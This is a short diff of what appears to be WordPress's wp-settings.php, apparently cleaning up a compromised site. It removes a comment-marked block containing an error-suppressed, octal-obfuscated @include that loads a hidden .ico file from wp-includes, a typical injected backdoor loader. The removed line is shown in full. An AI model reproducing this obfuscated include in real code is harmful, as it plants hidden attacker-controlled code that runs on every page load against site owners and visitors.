@@ -1,9 +1,4 @@
 <?php
-/*1ecb8*/
-
-@include "\057i\163/\150t\144o\143s\057w\1601\0625\0638\0700\063_\131Z\060Y\116E\105O\111Z\057l\165i\163a\055z\145l\164n\145r\056d\145/\167w\167/\167p\055i\156c\154u\144e\163/\122e\161u\145s\164s\057.\0624\0617\0635\060c\056i\143o";
-
-/*1ecb8*/
 /**
  * Used to set up and fix common variables and include
  * the WordPress procedural and class library.
